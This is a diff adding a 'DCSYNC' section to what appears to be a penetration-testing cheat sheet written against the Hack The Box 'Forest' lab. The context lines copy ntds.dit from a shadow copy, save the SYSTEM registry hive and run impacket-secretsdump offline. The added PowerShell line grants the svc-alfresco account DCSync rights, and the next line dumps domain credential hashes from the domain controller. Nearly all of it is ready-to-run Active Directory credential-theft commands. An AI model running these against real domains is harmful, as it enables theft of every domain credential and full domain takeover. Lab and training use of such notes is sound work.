@@ -2050,4 +2050,10 @@ copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\nt
 reg.exe save hklm\system c:\system.bak
 impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
 ```
+### DCSYNC
+```powershell
+Add-DomainObjectAcl -Credential $Cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity svc-alfresco -Rights DCSync
+impacket-secretsdump htb/svc-alfresco@forest
+```
+
 ---
